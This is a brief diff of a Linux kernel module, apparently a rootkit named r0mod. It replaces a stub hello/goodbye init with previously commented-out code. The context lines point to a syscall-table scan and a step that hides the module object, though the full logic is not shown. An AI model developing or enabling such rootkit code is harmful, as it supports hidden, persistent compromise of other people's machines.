@@ -53,19 +53,6 @@ unsigned long *find_sct_by_addr_scan(void)
 
 static int __init r0mod_init(void)
 {
-    DEBUG("HELLO\n");
-
-    return 0;
-}
-
-static void __exit r0mod_exit(void)
-{
-    DEBUG("GOODBYE\n");
-}
-
-/*
-static int __init r0mod_init(void)
-{
     DEBUG("Module starting...\n");
 
     //DEBUG("Hiding module object.\n");
@@ -104,7 +91,6 @@ static void __exit r0mod_exit(void)
 
     DEBUG("Module exited...\n");
 }
-*/
 
 module_init(r0mod_init);
 module_exit(r0mod_exit);
